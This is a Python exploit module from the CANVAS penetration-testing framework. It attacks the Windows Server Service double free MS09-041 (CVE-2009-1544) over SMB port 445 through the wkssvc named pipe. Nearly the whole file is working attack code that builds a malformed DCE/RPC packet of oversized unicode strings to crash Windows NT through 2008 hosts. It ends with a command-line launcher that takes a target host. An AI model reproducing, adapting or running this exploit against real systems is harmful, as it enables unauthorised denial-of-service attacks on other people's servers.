#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from msrpcexploit import msrpcexploit
from libs.newsmb.libdcerpc import s_dce_win2k_unistring
from libs.dcemarshall import *

# GUI info
NAME='Windows Server Service Double Free (MS09-041)'
DESCRIPTION='Windows Server Service NetrGetJoinDomainInformation() Double Free'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='09/11/2009'
DOCUMENTATION['CVE Name']='CVE-2009-1544'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1544'
DOCUMENTATION['CVSS'] = 9.0
DOCUMENTATION['CVS URL']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1544'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS09-041.mspx'
DOCUMENTATION['Repeatability']=''

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='DoS'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003','2008']
PROPERTY['MSADV']='MS09-041'

CHANGELOG="""
"""

targets={
    0: ['Autoversioning'],
    1: ['Windows All'],
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name                = NAME
        self.version             = 0
        self.badstring           = '\0\xff'
        self.searchbadstring     = '\0'
        self.UUID                = u'6bffd098-a112-3610-9833-46c3f87e345a' 
        self.uuidversion         = u'1.0'
        self.targetfunction      = 0x14
        self.autoversion         = 1
        self.sleeptime           = 4
        self.port                = 445
        self.namedpipe           = '\\wkssvc'
        self.buildConnectionList = self.buildTCPConnectionList
        self.needsNoShellcode    = 1

    def buildDcePacket(self):
        self.log('Using version %d'%(self.version))
        data=struct.pack('<L',0x00000001)
        data+=s_dce_win2k_unistring('A'*0xff)
        data+=struct.pack('<L',0x00000002)
        data+=s_dce_win2k_unistring('A'*0xff)
        return data

    def usage(self):
        print 'Usage: %s -v version -t host -l localIP -d localPort (connectback) [ -p port -T (toggle test mode) ]'% sys.argv[0]        
    
if __name__=='__main__':
    app=theexploit()    
    ret=standard_callback_commandline(app)
